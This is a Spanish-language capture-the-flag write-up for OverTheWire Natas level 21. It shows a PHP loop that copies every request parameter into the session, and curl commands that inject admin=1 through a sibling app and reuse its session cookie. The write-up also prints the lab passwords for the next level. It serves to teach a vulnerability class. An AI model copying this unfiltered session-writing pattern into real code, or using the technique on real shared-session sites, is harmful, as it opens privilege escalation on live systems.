# Natas Level21

## Descripción
> **Level Goal (natas21.natas.labs.overthewire.org):** Igual que antes, solo revela las credenciales si `$_SESSION["admin"] == 1`, pero avisa de que el sitio está "colocado" (mismo servidor) junto a `http://natas21-experimenter.natas.labs.overthewire.org`, una segunda aplicación (un "experimentador de estilos CSS") que comparte sesiones PHP con la primera.

## Solución
`natas21-experimenter` deja elegir colores/alineación/tamaño de fuente y los guarda en `$_SESSION`, mostrando un formulario que solo expone tres claves permitidas (`align`, `fontsize`, `bgcolor`). Pero el código que procesa el envío es mucho menos restrictivo que el formulario:

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```

Este bucle vuelca **cualquier** parámetro recibido (GET o POST) directamente a `$_SESSION`, sin filtrar por la lista de claves válidas — la validación de "solo estas claves" solo se aplica a qué se *muestra* en el formulario, no a qué se *guarda*. Como ambos sitios comparten el mismo almacén de sesiones PHP (mismo servidor, mismo `session_save_path`, cookies sin restricción de dominio entre subdominios), basta con fijar `admin=1` en el experimentador y luego reutilizar el mismo `PHPSESSID` en `natas21`.

```bash
# 1) Inyectar admin=1 en la sesión a través del formulario "de estilos"
curl -s -v -u natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU \
  "http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=1&admin=1" \
  2>&1 | grep -i "set-cookie"
# Set-Cookie: PHPSESSID=1gnbvqmperqbi5phd9a6kchvf3; path=/; HttpOnly

# 2) Reutilizar ese mismo PHPSESSID contra la app real
curl -s -u natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU \
  -b "PHPSESSID=1gnbvqmperqbi5phd9a6kchvf3" \
  http://natas21.natas.labs.overthewire.org/index.php
# You are an admin. The credentials for the next level are:
# Username: natas22
# Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF
```

## Notas adicionales
- La lección central: **validar solo en la capa de presentación (qué se muestra) no protege nada si la capa de escritura (qué se guarda) no aplica la misma restricción.** La lista blanca de `$validkeys` nunca se usa para filtrar el `foreach` que escribe en `$_SESSION`.
- Dos aplicaciones "distintas" que comparten sesión (mismo servidor, cookies de sesión sin aislar por subdominio/aplicación) amplían la superficie de ataque de cada una: una vulnerabilidad de inyección de variables de sesión en una app trivial (un simple selector de estilos CSS) termina comprometiendo la sesión de otra app completamente distinta.

## Referencias
- Reto original: http://natas21.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection (relacionado conceptualmente: confiar en datos de entrada para poblar estructuras internas sin filtrar)
